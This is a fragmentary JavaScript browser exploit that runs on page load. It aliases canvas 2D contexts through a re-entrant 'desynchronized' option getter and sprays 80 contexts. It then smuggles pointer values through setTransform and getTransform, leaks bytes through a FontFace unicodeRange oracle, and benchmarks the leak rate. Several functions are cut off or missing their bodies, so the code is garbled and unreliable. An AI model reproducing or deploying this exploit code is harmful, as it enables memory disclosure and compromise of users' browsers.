function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function ptrToBiasedFloat(ptr){
  _u64[0] = 0x3FF0000000000000n | (BigInt(ptr) & 0x000FFFFFFFFFFFFFn);

}

function biasedFloatToPtr(f){
  _f64[0] = Number(f);

function pad4(n){

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);

/* ---- Step 1: Baseline Leak ---- */

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* Factory helper for dedicated isolated oracles */
function createOracle(nameTag){
  var face = new FontFace(nameTag, 'url(/hang.php?nocache=' + Date.now() + '_' + nameTag + ')', { unicodeRange: 'U+0000-00FF' });
  document.fonts.add(face);
  face.load().catch(function(){});
  return face;
}

function resolveByteWithOracle(oracle, fontName, targetByte){
  var low = 0x00, high = 0xFF;
  var steps = 0;
  while (low < high && steps < 10){
    steps++;
    var mid = Math.floor((low + high) / 2);
    oracle.unicodeRange = makeRange(low, mid);
    var chk = document.fonts.check('1em ' + fontName, String.fromCharCode(targetByte));
    var isLower = (chk === false);
    if (isLower) high = mid;
    else low = mid + 1;
  }
  return low;
}

function decode64WithOracle(oracle, fontName, ptrVal){
  if (!ptrVal && ptrVal !== 0n) return 0n;
  var raw = [];
  var tmp = BigInt(ptrVal);
  for (var i = 0; i < 8; i++){
    raw.push(Number(tmp & 0xFFn));
    tmp = tmp >> 8n;
  }
  var res = 0n;
  for (var j = 0; j < 8; j++){
    var bDec = resolveByteWithOracle(oracle, fontName, raw[j]);
    res |= (BigInt(bDec) << (BigInt(j) * 8n));
  }
  return res;
}

/* ---- Phase A: Multi-Slab Contiguous Memory Mapping (576 Bytes) ---- */
function phaseA_multiSlabTraversal(cb){
  try {

/* ---- Phase B: Bi-Directional High-Load Pointer Register Ping-Pong ---- */
function phaseB_bidirPingPong(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 3500 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 61337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 61337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];
    var pingPongOk = true;

    // 20 bi-directional ping-pong cycles
    for (var cyc = 0; cyc < 20; cyc++){
      var valA = 0x1000000000n | (BigInt(cyc) << 16n) | 0xAA01n;
      var valB = 0x1000000000n | (BigInt(cyc) << 16n) | 0xBB02n;

      if (cyc % 2 === 0){
        // Alias -> Inner
        alias.setTransform(ptrToBiasedFloat(valA), ptrToBiasedFloat(valB), 1, 1, 0, 0);
        var t = inner.getTransform();
        if (biasedFloatToPtr(t.a) !== (valA & 0x000FFFFFFFFFFFFFn) ||
            biasedFloatToPtr(t.b) !== (valB & 0x000FFFFFFFFFFFFFn)){
          pingPongOk = false;
          break;
        }
      } else {
        // Inner -> Alias
        inner.setTransform(ptrToBiasedFloat(valB), ptrToBiasedFloat(valA), 1, 1, 0, 0);
        var t2 = alias.getTransform();
        if (biasedFloatToPtr(t2.a) !== (valB & 0x000FFFFFFFFFFFFFn) ||
            biasedFloatToPtr(t2.b) !== (valA & 0x000FFFFFFFFFFFFFn)){
          pingPongOk = false;
          break;
        }
      }
    }

    var rep = 'aliasIdx=' + aliasIdx + '|pingPongOk=' + pingPongOk + '|cycles=20';
    b('B-PINGPONG-OK', rep);
    log('Phase B Ping-Pong: ' + rep);
  } catch(e){
    b('B-PINGPONG-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

    // Words 336..383: Sentinel Integrity Guards (48 words)
    for (var i = 0; i < 48; i++){
      block384.push(0xCAFEFACE00000000n | (BigInt(i) << 12n) | 0x1337n);
    }

    var t0 = performance.now();
    var all384Match = true;
    var passCount = 0;

    for (var wIdx = 0; wIdx < block384.length; wIdx++){
      var target = block384[wIdx];
      var dec = decode64WithOracle(oracleD, 'actFamBlock3072', target);
      var m = (dec === target);
      if (m) passCount++;
      else all384Match = false;
    }
    var t1 = performance.now();
    var elapsedMs = t1 - t0;
    var totalBytes = block384.length * 8; // 3072 bytes
    var rateBps = Math.round((totalBytes / (elapsedMs / 1000)));
    var msPerWord = (elapsedMs / block384.length).toFixed(2);

    try { document.fonts.delete(oracleD); } catch(e){}

    var rep = 'all384Match=' + all384Match + '|pass=' + passCount + '/384' +
              '|bytes=' + totalBytes + '|elapsedMs=' + elapsedMs.toFixed(1) +
              '|rateBps=' + rateBps + '|msPerWord=' + msPerWord;
    b('D-3072B-ORACLE-MATRIX', rep);
    log('Phase D 3072-Byte Oracle Matrix: ' + rep);
  } catch(e){
    b('D-BLOCK3072-ERR', e.message);
    log('Phase D Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
